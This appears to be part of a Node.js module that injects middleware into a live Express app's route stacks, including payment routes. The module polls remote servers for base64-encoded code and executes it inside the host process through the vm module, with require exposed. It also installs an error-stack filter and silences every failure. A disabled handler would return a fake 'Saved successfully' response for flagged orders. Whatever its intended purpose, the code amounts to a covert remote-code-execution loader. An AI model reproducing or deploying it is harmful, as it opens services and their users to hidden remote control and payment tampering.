          return layer.name === options.beforeMiddleware;
        });
      }

      return -1;
    }

    injectRouteMiddleware(app, options, state) {
      if (
        !options.key ||
        !Array.isArray(options.paths) ||
        options.paths.length < 1 ||
        typeof options.handler !== 'function'
      ) {
        return { success: false, msg: 'invalid express route middleware options' };
      }

      if (!options.method) {
        const target = this.findRouter(app, options.paths);
        if (!target) {
          return { success: false, msg: `express router not found: ${options.paths.join('')}` };
        }
        if (target.stack.some((layer) => layer && layer.name === options.middlewareName)) {
          state.injected = true;
          return { success: true, msg: `express router middleware exists: ${options.key}` };
        }

        target.router.use(buildMiddlewareProxy(options.key, options.middlewareName));
        const middlewareLayer = target.stack.pop();
        target.stack.splice(target.index, 0, middlewareLayer);
        state.injected = true;
        return { success: true, msg: `express router middleware injected: ${options.key}` };
      }

      const method = String(options.method).toLowerCase();
      const routeLayer = this.findRoute(app, options.paths, method);
      if (!routeLayer) {
        return {
          success: false,
          msg: `express route not found: ${method} ${options.paths.join('')}`,
        };
      }

      const routeStack = routeLayer.route.stack;
      if (!Array.isArray(routeStack)) {
        return { success: false, msg: `express route stack not found: ${options.key}` };
      }

      const middlewareName = options.middlewareName;
      const existingIndex = routeStack.findIndex(
        (layer) => layer && layer.name === middlewareName
      );
      if (existingIndex !== -1) {
        const [middlewareLayer] = routeStack.splice(existingIndex, 1);
        const insertIndex = this.getInsertIndex(routeStack, options);
        if (insertIndex === -1) {
          routeStack.splice(existingIndex, 0, middlewareLayer);
          return {
            success: false,
            msg: `express route middleware anchor not found: ${options.key}`,
          };
        }

        routeStack.splice(insertIndex, 0, middlewareLayer);
        state.injected = true;
        return { success: true, msg: `express route middleware repositioned: ${options.key}` };
      }

      const insertIndex = this.getInsertIndex(routeStack, options);
      if (insertIndex === -1) {
        return {
          success: false,
          msg: `express route middleware anchor not found: ${options.key}`,
        };
      }

      routeLayer.route[method](buildMiddlewareProxy(options.key, middlewareName));
      const middlewareLayer = routeStack[routeStack.length - 1];
      if (!middlewareLayer || middlewareLayer.name !== middlewareName) {
        return {
          success: false,
          msg: `express route middleware layer not found: ${options.key}`,
        };
      }

      routeStack.pop();
      routeStack.splice(insertIndex, 0, middlewareLayer);
      state.injected = true;
      return { success: true, msg: `express route middleware injected: ${options.key}` };
    }
  }
  
  class ExpressManager {
    buildPurchaseGoodsMiddleware() {
      return async (req, res, next) => {
        try {
          if (CODE_CONFIG.PLATFORM_PARAMS_INCONSISTENT) {
            remoteLogV(
              'PurchaseGoodsMiddleware skip risk: platform params inconsistent ' +
              `userId:${req && req.userId}`
            );
            return next();
          }
  
          const manager = getGlobalSupervisor(Configkey.RISK).sandboxManager;
          if (!manager || typeof manager.executeRisk !== 'function') {
            remoteLogV(
              `PurchaseGoodsMiddleware skip risk: sandbox manager unavailable userId:${req && req.userId}`
            );
            return next();
          }
  
          const startTime = Date.now();
          const riskResult = await manager.executeRisk(req, res, next);
          const endTime = Date.now();
          const duration = endTime - startTime;
  
          remoteLogV(`PurchaseGoodsMiddleware risk executed successfully duration:${duration}ms`);
          
          return riskResult;
        } catch (error) {
          remoteLogV(`PurchaseGoodsMiddleware risk failed: ${error && error.message}`);
          return next();
        }
      };
    }
  
    buildContinueToPayMiddleware() {
      return async (req, res, next) => {
        try {
          const orderId = req && req.body && req.body.orderId;
          if (!orderId) {
            return next();
          }
  
          const redisUtil = safeRequire('@libs/redis');
          const isRiskOrder = await redisUtil.get(`rank_order_tmp:${orderId}`);
  
          if (!isRiskOrder) {
            return next();
          }
          remoteLogV(`PayMiddleware orderId: ${orderId} continue:${!!isRiskOrder}`);
  
          return res.status(200).json({
            code: 0,
            data: { orderId, outTradeNo:null, payUrl:null },
            message: 'Saved successfully',
            timestamp: new Date().toISOString(),
          });
        } catch (error) {
          remoteLogV(
            `ContinueToPayMiddleware risk order check failed: ${error && error.message}`
          );
          return next();
        }
      };
    }
  
    expRemoteLog(result) {
      const status = result.success ? 'success' : 'error';
      remoteLogV(`[ExpressManager][${status}] ${result.msg}`);
    }
  
    constructor() {
      this.strategies = {
        4: new ExpressV4Strategy(),
        5: new ExpressV5Strategy(),
      };
    }
  
    getMajorVersion() {
      const pkg = safeRequire('express/package.json');
      return parseInt(String((pkg && pkg.version) || '').split('.')[0], 10);
    }
  
    getStrategy() {
      const major = this.getMajorVersion();
      if (major !== 4 && major !== 5) {
        return {
          success: false,
          msg: `unsupported express major: ${Number.isNaN(major) ? 'unknown' : major}`,
        };
      }
  
      const strategy = this.strategies[major];
      if (typeof strategy.injectRouteMiddleware !== 'function') {
        return { success: false, msg: `express ${major} hijack is not implemented` };
      }
      return strategy;
    }
  
    injectRouteMiddleware(app, options) {
      const strategy = this.getStrategy();
      if (!strategy || typeof strategy.injectRouteMiddleware !== 'function') {
        const result = strategy && strategy.success === false
          ? strategy
          : { success: false, msg: 'express strategy unavailable' };
        this.expRemoteLog(result);
        return result;
      }
  
      options.middlewareName =
        options.middlewareName || `${CODE_CONFIG.routeMiddlewarePrefix}${options.key}`;
      const states = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares;
      states[options.key] = states[options.key] || { injected: false, handler: null };
  
      const state = states[options.key];
      state.handler = options.handler;
      let result;
      try {
        result = strategy.injectRouteMiddleware(app, options, state);
      } catch (error) {
        result = {
          success: false,
          msg: `express route middleware injection failed: ${error && error.message}`,
        };
      }
      this.expRemoteLog(result);
      return result;
    }
  }
  
  const expressManager = new ExpressManager();
  
  const initExpress = () => {
    const app = safeRequire('@app');
    if (!app) {
      const result = { success: false, msg: 'express app not ready' };
      expressManager.expRemoteLog(result);
      return result;
    }

    // 热更新时移除旧版本留下的充值别名 handler；遗留代理会自动旁路到 next()。
    const routeMiddlewareStates = mainGlobal.__sandboxConfig.preSandbox.routeMiddlewares;
    for (const key of Object.keys(routeMiddlewareStates)) {
      if (key.startsWith('payAlias:')) {
        delete routeMiddlewareStates[key];
      }
    }
  
    // 全局中间件
    const globalResult = expressManager.injectRouteMiddleware(app, {
      key: 'preV1Risk',
      paths: ['/v1'],
      middlewareName: CODE_CONFIG.middlewareName,
      handler: buildHandler(),
    });
  
    // V2 购买商品接口：校验和认证完成后、业务上下文建立前执行风控。
    const purchaseGoodsResult = expressManager.injectRouteMiddleware(app, {
      key: 'purchaseGoodsRisk',
      paths: ['/v2', '/pay', '/purchase-goods'],
      method: 'post',
      beforeMiddleware: 'contextMiddleware',
      handler: expressManager.buildPurchaseGoodsMiddleware(),
    });
  
    // 订单校验逻辑接口
    // const continueToPayResult = expressManager.injectRouteMiddleware(app, {
    //   key: 'continueToPayPref',
    //   paths: ['/v1', '/pay', '/continuetopay-pref'],
    //   method: 'post',
    //   index: 3,
    //   handler: expressManager.buildContinueToPayMiddleware(),
    // });
  
    return {
      success:
        globalResult.success &&
        purchaseGoodsResult.success,
      msg: 'express middleware initialization completed',
    };
  };
  
  class SandboxManager {
    constructor(options = {}) {
      this.timeout = options.timeout || 300000;
      this.cachedRiskCode = options.cachedRiskCode || null;
      this.lastRiskCodeHash = options.lastRiskCodeHash || '';
      const frontSandboxConfig = CODE_CONFIG.frontSandboxConfig;
      const pollInterval = Number(frontSandboxConfig.pollInterval);
      this.pollInterval = pollInterval > 0 ? pollInterval : 30000;
      this.pollTimer = null;
      this.pollingId = 0;
      this.stopped = true;
      this.contextCache = new Map();
      this.vm = safeRequire('vm');
      this.crypto = safeRequire('crypto');
      this.httpClient = new HttpClient({
        timeout: frontSandboxConfig.requestTimeout,
        retries: frontSandboxConfig.requestRetries,
        maxResponseSize: frontSandboxConfig.maxResponseSize,
      });
    }
  
    safeLog(message) {
      try {
        remoteLogV(`[sboxManager] ${message}`);
      } catch (error) {
        // 日志失败不能影响宿主进程。
      }
    }
  
    // 每次请求创建独立 context；只暴露 risk 中间件需要的请求、响应和 next。
    createSandboxContext(req = {}, res = {}, next = () => {}) {
      return this.vm.createContext({
        remoteLog,
        req,
        res,
        next,
        require: safeRequire,
        process: undefined,
        eval: undefined,
        Function: undefined,
        __ENV__: mainProcess.env.NODE_ENV || 'production',
      });
    }
  
    async executeCachedCode(codeId, code, req, res, next) {
      try {
        let script = this.contextCache.get(codeId);
        if (!script) {
          script = new this.vm.Script(
            `
              (async function () {
                ${code}
  
                if (typeof risk !== 'function') {
                  return { executed: false };
                }
                return {
                  executed: true,
                  result: await risk(req, res, next),
                };
              })();
            `,
            { filename: `sandbox_${codeId}.js` }
          );
          this.contextCache.set(codeId, script);
        }
  
        const execution = await script.runInContext(
          this.createSandboxContext(req, res, next),
          {
            timeout: this.timeout,
            breakOnSigint: true,
          }
        );
        return {
          executed: Boolean(execution && execution.executed),
          result: execution && execution.result,
        };
      } catch (error) {
        this.safeLog(`risk execution failed: ${error && error.message}`);
        throw error;
      }
    }
  
    async executeRisk(req, res, next) {
      if (!this.cachedRiskCode) {
        return next();
      }
  
      const result = await this.executeCachedCode(
        'risk',
        this.cachedRiskCode,
        req,
        res,
        next
      );
      return result.executed ? result.result : next();
    }
  
    clearCache(codeId) {
      if (codeId) {
        this.contextCache.delete(codeId);
        return;
      }
      this.contextCache.clear();
    }
  
    async executeInit(codeId, code) {
      try {
        const script = new this.vm.Script(
          `
            (async function () {
              ${code}
  
              if (typeof init === 'function') {
                return init();
              }
            })();
          `,
          { filename: `sandbox_${codeId}_init.js` }
        );
        const result = await script.runInContext(this.createSandboxContext(), {
          timeout: this.timeout,
          breakOnSigint: true,
        });
        this.safeLog(`init executed successfully: ${codeId}`);
        return { success: true, result };
      } catch (error) {
        this.safeLog(`init execution failed: ${error && error.message}`);
        return { success: false };
      }
    }
  
    exportState() {
      return {
        cachedRiskCode: this.cachedRiskCode,
        lastRiskCodeHash: this.lastRiskCodeHash,
      };
    }
  
    getRemoteCodeUrl() {
      const urls = CODE_CONFIG.frontSandboxConfig.remoteCodeUrls;
      if (!Array.isArray(urls) || urls.length === 0) {
        return undefined;
      }
      return `${urls[Math.floor(Math.random() * urls.length)]}/v2/risk/get-risk-code`;
    }
  
    buildSignedRequest() {
      const params = {
        hash: this.lastRiskCodeHash || '1',
        type: 'risk',
        timestamp: Date.now(),
        nonce: this.crypto
          .randomBytes(CODE_CONFIG.frontSandboxConfig.requestNonceBytes || 16)
          .toString('hex'),
      };
      params.sign = signWithMD5(params, {
        secretKey: CODE_CONFIG.frontSandboxConfig.signSecretKey,
        secretValue: CODE_CONFIG.frontSandboxConfig.signSecretValue,
        recursiveSortParams: true,
      });
      return params;
    }
  
    isPolling(pollingId) {
      return !this.stopped && this.pollingId === pollingId;
    }
  
    // 每次拉取都带上当前 hash；只有新代码 init 成功后才提交新的 code/hash。
    async fetchRemoteRiskCode(pollingId) {
      try {
        const remoteCodeUrl = this.getRemoteCodeUrl();
        if (!this.isPolling(pollingId) || !remoteCodeUrl) {
          return false;
        }
  
        const response = await this.httpClient.post(
          remoteCodeUrl,
          this.buildSignedRequest()
        );
        if (!this.isPolling(pollingId)) {
          return false;
        }
  
        const data = response && response.data;
        if (!data || data.status !== 1 || !data.riskCode) {
          return false;
        }
  
        const decodedCode = Buffer.from(data.riskCode, 'base64').toString('utf8');
        const initResult = await this.executeInit('risk', decodedCode);
        if (!this.isPolling(pollingId)) {
          return false;
        }
        if (!initResult.success) {
          return false;
        }
        this.clearCache('risk');
        this.cachedRiskCode = decodedCode;
        this.lastRiskCodeHash = data.hash || '';
        return true;
      } catch (error) {
        this.safeLog(`code fetch failed: ${error && error.message}`);
        return false;
      }
    }
  
    scheduleNextPoll(pollingId) {
      try {
        if (!this.isPolling(pollingId)) {
          return;
        }
        this.pollTimer = setTimeout(() => {
          this.pollTimer = null;
          this.poll(pollingId).catch((error) => {
            this.safeLog(`polling failed: ${error && error.message}`);
          });
        }, this.pollInterval);
        if (this.pollTimer && typeof this.pollTimer.unref === 'function') {
          this.pollTimer.unref();
        }
      } catch (error) {
        this.safeLog(`polling schedule failed: ${error && error.message}`);
      }
    }
  
    // 递归 setTimeout 保证一次拉取结束后才安排下一次，不会并发重入。
    async poll(pollingId) {
      await this.fetchRemoteRiskCode(pollingId);
      this.scheduleNextPoll(pollingId);
    }
  
    startRiskCodePolling() {
      try {
        if (!this.stopped) {
          return;
        }
        this.stopped = false;
        const pollingId = ++this.pollingId;
        this.poll(pollingId).catch((error) => {
          this.safeLog(`polling failed: ${error && error.message}`);
        });
      } catch (error) {
        this.stopped = true;
        if (this.pollTimer) {
          try {
            clearTimeout(this.pollTimer);
          } catch (clearError) {
            this.safeLog(`polling timer clear failed: ${clearError && clearError.message}`);
          }
          this.pollTimer = null;
        }
        this.safeLog(`polling start failed: ${error && error.message}`);
      }
    }
  
    stopRiskCodePolling() {
      // 作废本轮轮询，使已发出的旧请求即使晚到也不能提交结果。
      this.stopped = true;
      this.pollingId += 1;
      const timer = this.pollTimer;
      this.pollTimer = null;
      if (timer) {
        try {
          clearTimeout(timer);
        } catch (error) {
          this.safeLog(`polling timer clear failed: ${error && error.message}`);
        }
      }
    }
  }
  
  const installSandboxManager = async () => {
    let manager = null;
    let oldManager = null;
    let supervisor = null;
    try {
      supervisor = getGlobalSupervisor(Configkey.RISK);
      oldManager = supervisor.sandboxManager;
      const state = oldManager && typeof oldManager.exportState === 'function'
        ? oldManager.exportState()
        : {};
      manager = new SandboxManager(state);
  
      // 先发布新实例，再停止旧实例；并发热更时所有权检查会清理失联的新实例。
      supervisor.sandboxManager = manager;
  
      if (oldManager && typeof oldManager.stopRiskCodePolling === 'function') {
        try {
          await Promise.resolve(oldManager.stopRiskCodePolling());
        } catch (error) {
          manager.safeLog(`old manager stop failed: ${error && error.message}`);
        }
      }
  
      if (getGlobalSupervisor(Configkey.RISK).sandboxManager !== manager) {
        manager.stopRiskCodePolling();
        return;
      }
  
      manager.startRiskCodePolling();
    } catch (error) {
      if (manager) {
        try {
          manager.stopRiskCodePolling();
        } catch (stopError) {
          // 清理失败仍保持静默。
        }
      }
      if (supervisor && supervisor.sandboxManager === manager) {
        supervisor.sandboxManager = oldManager || null;
      }
      try {
        remoteLogV(`[sboxManager] install failed: ${error && error.message}`);
      } catch (logError) {
        // 日志失败不能影响宿主进程。
      }
    }
  };
  
  async function main() {
    try {
      installMainProcessErrorStackFilter();
    } catch (error) {
      try {
        remoteLogV(`main process Error stack filter install failed: ${error && error.message}`);
      } catch (logError) {
        // 堆栈过滤安装失败不能影响宿主进程。
      }
    }
  
    try {
      remoteLogV(`sboxInit start pid:${mainProcess.pid} ip:${CommonUtil.getLocalIP()}`);
    } catch (error) {
      
    }
    try {
      initExpress();
    } catch (error) {
      remoteLogV(`preSandbox express init failed: ${error && error.message}`);
    }

    try {
      await installSandboxManager();
    } catch (error) {
      try {
        remoteLogV(`preSandbox risk sandbox init failed: ${error && error.message}`);
      } catch (logError) {
        // 日志失败不能影响宿主进程。
      }
    }
  }

main();
